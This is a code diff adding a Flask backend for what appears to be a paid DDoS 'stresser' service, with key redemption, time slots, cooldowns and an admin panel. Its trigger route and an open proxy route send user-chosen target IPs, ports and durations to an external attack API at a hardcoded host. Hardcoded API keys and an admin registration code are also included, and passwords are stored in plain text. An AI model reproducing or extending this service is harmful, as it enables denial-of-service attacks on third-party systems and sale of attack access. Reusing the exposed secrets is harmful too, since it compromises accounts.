@@ -1,0 +1,391 @@
+import time, sqlite3, random, string, requests, math, threading, re, os
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+DB_FILE = "users.db"
+lock = threading.Lock()
+
+# --- CONFIGURATION ---
+EXTERNAL_API_URL = "http://54.163.45.50:5555/attack"
+#EXTERNAL_API_URL = "https://goofystresse.st/api/external/attack"
+#SECRET_API_KEY = "a2fde61ac44edacd86495d19a93ce63e6a78a297039aa764a8d550f3c458afb0"
+SECRET_API_KEY = "xHeBSZx9Qipq0YgoxQqLoB7tBDy0zr75"
+IST_OFFSET = 19800  # 5.5 hours for IST
+LATEST_VERSION_CODE = 6
+UPDATE_APK_FILENAME = "app-release.apk"
+VPS_IP = "165.227.201.31"
+
+def connect_db():
+    conn = sqlite3.connect(DB_FILE, timeout=30)
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def init_db():
+    with connect_db() as conn:
+        conn.execute('''CREATE TABLE IF NOT EXISTS users 
+                     (uid TEXT, email TEXT UNIQUE, userid TEXT PRIMARY KEY, username TEXT, 
+                      password TEXT, is_admin INTEGER DEFAULT 0, is_approved INTEGER DEFAULT 0, 
+                      cooldown_until REAL DEFAULT 0, is_paid INTEGER DEFAULT 0, 
+                      paid_from REAL DEFAULT 0, paid_until REAL DEFAULT 0)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS keys 
+                     (key TEXT PRIMARY KEY, minutes REAL, status TEXT DEFAULT 'active',
+                      redeemed_by TEXT, redeemed_at REAL, created_at REAL)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS system_config (key TEXT PRIMARY KEY, value TEXT)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS active_attacks (username TEXT, userid TEXT, end_time REAL, tier TEXT)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS manual_slot_limits (slot_index INTEGER PRIMARY KEY, limit_val INTEGER)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS user_slots (userid TEXT, slot_start REAL, key_code TEXT)''')
+        
+        try: conn.execute("ALTER TABLE user_slots ADD COLUMN key_code TEXT")
+        except: pass
+        
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_user_slots_start ON user_slots(slot_start)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_user_slots_key ON user_slots(key_code)")
+
+        defaults = {"free_bot_enabled": "True", "paid_bot_enabled": "True", "free_slots": "1", "paid_slots": "3",
+                    "free_cooldown": "750", "paid_cooldown": "60", "seekbar_max": "180"}
+        for k, v in defaults.items(): 
+            conn.execute("INSERT OR IGNORE INTO system_config (key, value) VALUES (?, ?)", (k, v))
+        conn.commit()
+
+init_db()
+
+# --- HELPERS ---
+
+def get_cfg(key, default="0"):
+    with connect_db() as conn:
+        row = conn.execute("SELECT value FROM system_config WHERE key=?", (key,)).fetchone()
+        return row[0] if row else default
+
+def set_cfg(key, val):
+    with connect_db() as conn:
+        conn.execute("INSERT OR REPLACE INTO system_config (key, value) VALUES (?, ?)", (key, str(val)))
+        conn.commit()
+
+def get_slot_start(ts): return (int(ts) // 1800) * 1800
+
+def get_manual_limit(ts):
+    idx = (int(ts + IST_OFFSET) // 1800) % 48
+    with connect_db() as conn:
+        row = conn.execute("SELECT limit_val FROM manual_slot_limits WHERE slot_index=?", (idx,)).fetchone()
+        return row[0] if row is not None else None
+
+def get_slot_occupancy(slot_start):
+    with connect_db() as conn:
+        row = conn.execute("SELECT COUNT(*) FROM user_slots WHERE slot_start = ?", (slot_start,)).fetchone()
+        return row[0] if row else 0
+
+def clean_data():
+    try:
+        now = time.time()
+        with connect_db() as conn:
+            conn.execute("DELETE FROM user_slots WHERE slot_start + 1800 < ?", (now,))
+            conn.execute("DELETE FROM active_attacks WHERE end_time < ?", (now,))
+            conn.execute("UPDATE users SET is_paid = 1 WHERE userid IN (SELECT DISTINCT userid FROM user_slots)")
+            conn.execute("UPDATE users SET is_paid = 0 WHERE userid NOT IN (SELECT DISTINCT userid FROM user_slots) AND is_admin = 0")
+            conn.commit()
+    except: pass
+
+# --- CORE USER ROUTES ---
+
+@app.route('/proxy')
+def proxy():
+    target_url = "http://54.163.45.50:5555/attack"
+    # Forward all query parameters
+    params = request.args
+    response = requests.get(target_url, params=params)
+    return response.content, response.status_code
+
+# --- Update this route in your app.py ---
+
+@app.route('/api/status', methods=['GET'])
+def status():
+    userid = request.args.get('userid'); now = time.time(); clean_data()
+    u_wait, is_paid, exp_info = 0, 0, "FREE VERSION"
+    has_slot = False
+    booked_times = []
+    
+    if userid:
+        with connect_db() as conn:
+            u = conn.execute("SELECT username, cooldown_until, is_paid FROM users WHERE userid=?", (userid,)).fetchone()
+            if u:
+                u_wait = max(0, int((u['cooldown_until'] or 0) - now))
+                is_paid = u['is_paid']
+                curr_s = get_slot_start(now)
+                rows = conn.execute("SELECT slot_start FROM user_slots WHERE userid=? AND slot_start >= ? ORDER BY slot_start ASC", (userid, curr_s)).fetchall()
+                slot_list = [r['slot_start'] for r in rows]
+                if slot_list:
+                    # Logic to group slots into blocks for expiry_info display...
+                    blocks = []
+                    start = slot_list[0]; prev = slot_list[0]
+                    for i in range(1, len(slot_list)):
+                        if slot_list[i] == prev + 1800: prev = slot_list[i]
+                        else: blocks.append((start, prev + 1800)); start = slot_list[i]; prev = slot_list[i]
+                    blocks.append((start, prev + 1800))
+                    
+                    if blocks[0][0] <= now < blocks[0][1]:
+                        has_slot = True
+                        exp_info = f"PREMIUM: {int((blocks[0][1]-now)//60)}m Left"
+                    else:
+                        exp_info = f"SCHEDULED: {time.strftime('%H:%M', time.gmtime(blocks[0][0] + IST_OFFSET))}"
+
+    tier = "PAID" if is_paid else "FREE"
+    bot_global_on = (get_cfg(f"{tier.lower()}_bot_enabled") == "True")
+    
+    # FETCH ALL ACTIVE ATTACKS FOR FLOATING WINDOW
+    with connect_db() as conn:
+        atk_rows = conn.execute("SELECT username, end_time, tier FROM active_attacks").fetchall()
+        active_atks = [{"username": r['username'], "remaining": int(r['end_time'] - now), "tier": r['tier']} for r in atk_rows]
+
+    return jsonify({
+        "free_bot": get_cfg("free_bot_enabled") == "True",
+        "paid_bot": get_cfg("paid_bot_enabled") == "True",
+        "bot_enabled": bot_global_on and (has_slot if is_paid else True),
+        "tier_label": f"({tier})",
+        "is_paid": is_paid,
+        "has_slot": has_slot,
+        "expiry_info": exp_info,
+        "user_wait": u_wait,
+        "active_attacks": active_atks,
+        "seekbar_max": int(get_cfg("seekbar_max", "180"))
+    }), 200
+@app.route('/api/trigger_attack', methods=['POST'])
+def trigger():
+    clean_data(); d = request.json; now = time.time()
+    with connect_db() as conn:
+        u = conn.execute("SELECT username, cooldown_until, is_approved, is_paid FROM users WHERE userid=?", (d['userid'],)).fetchone()
+        if u and u['is_approved'] == 1:
+            if not conn.execute("SELECT 1 FROM user_slots WHERE userid=? AND slot_start=?", (d['userid'], get_slot_start(now))).fetchone(): return jsonify({"error": "No Slot Available Now"}), 403
+            if now < (u['cooldown_until'] or 0): return jsonify({"error": "Cooldown"}), 400
+            tier = "PAID" if u['is_paid'] else "FREE"
+            if get_cfg(f"{tier.lower()}_bot_enabled") != "True": return jsonify({"error": "Offline"}), 403
+            if conn.execute("SELECT COUNT(*) FROM active_attacks WHERE tier=?", (tier,)).fetchone()[0] < int(get_cfg(f"{tier.lower()}_slots")):
+                def run():
+                 #   try: requests.get(f"{EXTERNAL_API_URL}?key={SECRET_API_KEY}&host={d['target']}&port={d['port']}&time={d['duration']}&method=UDPBOT&concurrents=3", timeout=15)
+                    try: requests.get(f"{EXTERNAL_API_URL}?key={SECRET_API_KEY}&ip={d['target']}&port={d['port']}&time={d['duration']}", timeout=15)
+                    except: pass
+                threading.Thread(target=run).start()
+                conn.execute("INSERT INTO active_attacks (username, userid, end_time, tier) VALUES (?,?,?,?)", (u['username'], d['userid'], now + int(d['duration']), tier))
+                conn.execute("UPDATE users SET cooldown_until=? WHERE userid=?", (now + int(d['duration']) + int(get_cfg(f"{tier.lower()}_cooldown")), d['userid']))
+                conn.commit(); return jsonify({"status": "ok"}), 200
+    return jsonify({"error": "Failed"}), 400
+
+@app.route('/api/redeem', methods=['POST'])
+def redeem():
+    with lock:
+        d = request.json; now = time.time(); clean_data()
+        uid, k_code, offset = d.get('userid'), d.get('key'), int(d.get('start_offset', 0))
+        start_t = now + offset
+        with connect_db() as conn:
+            if conn.execute("SELECT 1 FROM user_slots WHERE userid=?", (uid,)).fetchone(): return jsonify({"error": "Active subscription already exists"}), 403
+            k = conn.execute("SELECT minutes FROM keys WHERE key=? AND status='active'", (k_code,)).fetchone()
+            if not k: return jsonify({"error": "Invalid or Expired Key"}), 400
+            
+            needed_sec = float(k['minutes']) * 60
+            found_slots, skipped_times = [], []
+            curr = get_slot_start(start_t)
+            limit = int(get_cfg("paid_slots"))
+            
+            while len(found_slots) < 100:
+                lim = get_manual_limit(curr)
+                if lim is None: lim = limit
+                
+                if get_slot_occupancy(curr) < lim:
+                    found_slots.append(curr)
+                    total_dur = 0
+                    for s in found_slots:
+                        if s == get_slot_start(now) and now > s: total_dur += (s + 1800 - now)
+                        else: total_dur += 1800
+                    if total_dur >= needed_sec: break
+                else:
+                    if offset == 0: skipped_times.append(time.strftime('%H:%M', time.gmtime(curr + IST_OFFSET)))
+                curr += 1800
+
+            if not found_slots: return jsonify({"error": "No space available"}), 429
+
+            is_delayed = (found_slots[0] > get_slot_start(now))
+            is_fragmented = (found_slots[-1] - found_slots[0] != (len(found_slots)-1)*1800)
+            
+            if offset == 0 and (is_delayed or is_fragmented):
+                msg = ""
+                if is_delayed: msg = f"Slot {time.strftime('%H:%M', time.gmtime(get_slot_start(now)+IST_OFFSET))} is full. "
+                if is_fragmented: 
+                    msg += f"Slot {skipped_times[0] if skipped_times else 'a middle slot'} is full. Your session will be split. "
+                msg += f"Your key will start at {time.strftime('%H:%M', time.gmtime(found_slots[0]+IST_OFFSET))}. Continue?"
+                return jsonify({"error": msg, "suggested_offset": int(found_slots[0] - now)}), 429
+
+            for s in found_slots:
+                conn.execute("INSERT INTO user_slots (userid, slot_start, key_code) VALUES (?, ?, ?)", (uid, s, k_code))
+            conn.execute("UPDATE users SET is_paid=1 WHERE userid=?", (uid,))
+            conn.execute("UPDATE keys SET status='redeemed', redeemed_by=?, redeemed_at=? WHERE key=?", (uid, now, k_code))
+            conn.commit()
+            return jsonify({"message": "OK", "start_time": time.strftime('%H:%M', time.gmtime(found_slots[0] + IST_OFFSET))}), 200
+
+# --- ADMIN ROUTES ---
+
+@app.route('/api/admin/toggle_free_bot', methods=['POST'])
+def admin_toggle_free():
+    v = "False" if get_cfg("free_bot_enabled") == "True" else "True"
+    set_cfg("free_bot_enabled", v)
+    return jsonify({"status": "ok", "enabled": v == "True"}), 200
+
+@app.route('/api/admin/toggle_paid_bot', methods=['POST'])
+def admin_toggle_paid():
+    v = "False" if get_cfg("paid_bot_enabled") == "True" else "True"
+    set_cfg("paid_bot_enabled", v)
+    return jsonify({"status": "ok", "enabled": v == "True"}), 200
+
+@app.route('/api/admin/get_limits', methods=['GET'])
+def admin_get_limits():
+    cfg = {row['key']: row['value'] for row in connect_db().execute("SELECT key, value FROM system_config").fetchall()}
+    return jsonify({
+        "free_slots": cfg.get("free_slots"), "paid_slots": cfg.get("paid_slots"),
+        "free_cd": cfg.get("free_cooldown"), "paid_cd": cfg.get("paid_cooldown"),
+        "seekbar_max": cfg.get("seekbar_max"),
+        "free_bot": cfg.get("free_bot_enabled") == "True",
+        "paid_bot": cfg.get("paid_bot_enabled") == "True"
+    }), 200
+
+@app.route('/api/admin/set_limits', methods=['POST'])
+def admin_set_limits():
+    d = request.json
+    mapping = {'free_slots':'free_slots','paid_slots':'paid_slots','free_cd':'free_cooldown','paid_cd':'paid_cooldown','seekbar_max':'seekbar_max'}
+    for k, v in mapping.items():
+        if k in d: set_cfg(v, d[k])
+    return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/all_keys', methods=['GET'])
+def admin_all_keys():
+    now = time.time(); clean_data(); search_q = request.args.get('search', '').lower()
+    with connect_db() as conn: 
+        rows = conn.execute("SELECT k.key, k.minutes, k.status, k.redeemed_by, u.username, k.redeemed_at FROM keys k LEFT JOIN users u ON k.redeemed_by = u.userid").fetchall()
+    avail, red, exp = [], [], []
+    for r in rows:
+        key_code, user_name = r['key'], (r['username'] or r['redeemed_by'] or "N/A")
+        if search_q and (search_q not in key_code.lower() and search_q not in user_name.lower()): continue
+        r_at = time.strftime('%d %b, %H:%M', time.gmtime((r['redeemed_at'] or 0) + IST_OFFSET)) if r['redeemed_at'] else "N/A"
+        item = {"key": key_code, "minutes": r['minutes'], "duration_min": r['minutes'], "user_name": user_name, "user_id": r['redeemed_by'], "redeemed_at": r_at}
+        if r['status'] == 'active': avail.append(item)
+        elif r['status'] == 'expired': item["rem_time"] = "Expired"; exp.append(item)
+        else:
+            k_slots = connect_db().execute("SELECT MAX(slot_start) FROM user_slots WHERE key_code=?", (key_code,)).fetchone()
+            last_end = (k_slots[0]+1800) if k_slots[0] else (r['redeemed_at'] + (r['minutes']*60))
+            if last_end > now: 
+                rt = last_end-now; item["rem_time"] = f"{int(rt//3600)}h {int((rt%3600)//60)}m"; red.append(item)
+            else: item["rem_time"] = "Expired"; exp.append(item)
+    return jsonify({"available": avail, "redeemed": red, "expired": exp}), 200
+
+@app.route('/api/admin/generate_key', methods=['POST'])
+def admin_generate_key():
+    d = request.json
+    with connect_db() as conn:
+        for _ in range(int(d.get('count', 1))):
+            k = "DX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+            conn.execute("INSERT INTO keys (key, minutes, created_at) VALUES (?, ?, ?)", (k, float(d.get('minutes', 60)), time.time()))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/delete_key', methods=['POST'])
+def admin_delete_key():
+    k = request.json.get('key')
+    with connect_db() as conn:
+        conn.execute("DELETE FROM user_slots WHERE key_code=?", (k,))
+        conn.execute("UPDATE keys SET status='expired' WHERE key=?", (k,))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/all_users', methods=['GET'])
+def admin_all_users():
+    clean_data(); now = time.time()
+    with connect_db() as conn:
+        rows = conn.execute("SELECT uid, email, userid, username, is_approved, is_paid, paid_until FROM users").fetchall()
+    return jsonify([{"uid":r['uid'],"email":r['email'],"userid":r['userid'],"username":r['username'],"approved":r['is_approved'],"is_paid":r['is_paid'],"rem_time": (f"{int((r['paid_until']-now)//3600)}h" if r['paid_until']>now else "FREE")} for r in rows]), 200
+
+@app.route('/api/admin/approve_user', methods=['POST'])
+def admin_approve_user():
+    uid = request.json.get('target_userid')
+    with connect_db() as conn:
+        conn.execute("UPDATE users SET is_approved=1 WHERE userid=?", (uid,))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/delete_user', methods=['POST'])
+def admin_delete_user():
+    uid = request.json.get('target_userid')
+    with connect_db() as conn:
+        conn.execute("DELETE FROM user_slots WHERE userid=?", (uid,))
+        conn.execute("DELETE FROM users WHERE userid=?", (uid,))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/extend_time', methods=['POST'])
+def admin_extend_time():
+    d = request.json; sec = int(d.get('minutes', 0)) * 60; target = d.get('target_userid')
+    with connect_db() as conn:
+        if target: conn.execute("UPDATE users SET is_paid=1, paid_until = MAX(paid_until, ?) + ? WHERE userid = ?", (time.time(), sec, target))
+        else: conn.execute("UPDATE users SET paid_until = paid_until + ? WHERE is_paid = 1", (sec,))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/reset_password', methods=['POST'])
+def admin_reset_password():
+    d = request.json
+    with connect_db() as conn: 
+        conn.execute("UPDATE users SET password=? WHERE userid=?", (d['new_password'], d['target_userid']))
+        conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/set_manual_slot_limit', methods=['POST'])
+def admin_set_manual_limit():
+    d = request.json; indices, limit = d.get('indices'), d.get('limit')
+    if indices is not None and limit is not None:
+        limit_val, now = int(limit), time.time()
+        curr_daily_idx = (int(now + IST_OFFSET) // 1800) % 48
+        with connect_db() as conn:
+            for s_idx in indices:
+                target_daily_idx = (curr_daily_idx + int(s_idx)) % 48
+                if limit_val < 0: conn.execute("DELETE FROM manual_slot_limits WHERE slot_index=?", (target_daily_idx,))
+                else: conn.execute("INSERT OR REPLACE INTO manual_slot_limits (slot_index, limit_val) VALUES (?, ?)", (target_daily_idx, limit_val))
+            conn.commit(); return jsonify({"message": "OK"}), 200
+    return jsonify({"error": "Params"}), 400
+
+@app.route('/api/admin/bulk_delete_keys', methods=['POST'])
+def admin_bulk_delete():
+    with connect_db() as conn: conn.execute("DELETE FROM keys WHERE status='active'"); conn.commit(); return jsonify({"message": "OK"}), 200
+
+@app.route('/api/admin/purge_redeemed_keys', methods=['POST'])
+def admin_purge_keys():
+    with connect_db() as conn: conn.execute("DELETE FROM keys WHERE status='redeemed'"); conn.commit(); return jsonify({"message": "OK"}), 200
+
+# --- CORE AUTH & UTILITY ROUTES ---
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    d = request.json
+    with connect_db() as conn:
+        u = conn.execute("SELECT is_approved, is_admin, username, uid, is_paid FROM users WHERE userid=? AND password=?", (d['userid'], d['password'])).fetchone()
+        if u: return jsonify({"username": u['username'], "is_admin": u['is_admin'], "uid": u['uid'], "userid": d['userid'], "is_paid": u['is_paid']}) if u['is_approved']==1 else (jsonify({"error": "Pending"}), 403)
+    return jsonify({"error": "Invalid"}), 401
+
+@app.route('/api/register', methods=['POST'])
+def register():
+    d = request.json
+    try:
+        with connect_db() as conn:
+            adm = 1 if d.get('admin_code') == "DX_ADMIN_2024" else 0
+            conn.execute("INSERT INTO users (uid, email, userid, username, password, is_admin, is_approved) VALUES (?,?,?,?,?,?,?)", (f"DX-{random.randint(1000,9999)}", d['email'], d['userid'], d['username'], d['password'], adm, 1 if adm else 0))
+            conn.commit(); return jsonify({"status": "Success"}), 200
+    except: return jsonify({"error": "Exists"}), 400
+
+@app.route('/api/slots_status', methods=['GET'])
+def slots_status():
+    now = time.time(); clean_data(); conn = connect_db(); def_p = int(get_cfg("paid_slots"))
+    rows = conn.execute("SELECT s.slot_start, u.username FROM user_slots s JOIN users u ON s.userid = u.userid").fetchall()
+    slots = []; base = get_slot_start(now)
+    for i in range(48):
+        s_s = base + (i * 1800)
+        lim = get_manual_limit(s_s)
+        if lim is None: lim = def_p
+        occ = [r['username'] for r in rows if r['slot_start'] == s_s]
+        slots.append({"time": time.strftime('%H:%M', time.gmtime(s_s + IST_OFFSET)), "status": f"[{len(occ)}/{lim}]", "users": ", ".join(occ) if occ else "Empty"})
+    return jsonify(slots), 200
+
+@app.route('/api/check_update', methods=['GET'])
+@app.route('/api/admin/check_update', methods=['POST'])
+def check_update(): return jsonify({"version_code": LATEST_VERSION_CODE, "apk_url": f"http://{VPS_IP}:5000/static/{UPDATE_APK_FILENAME}"}), 200
+
+if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
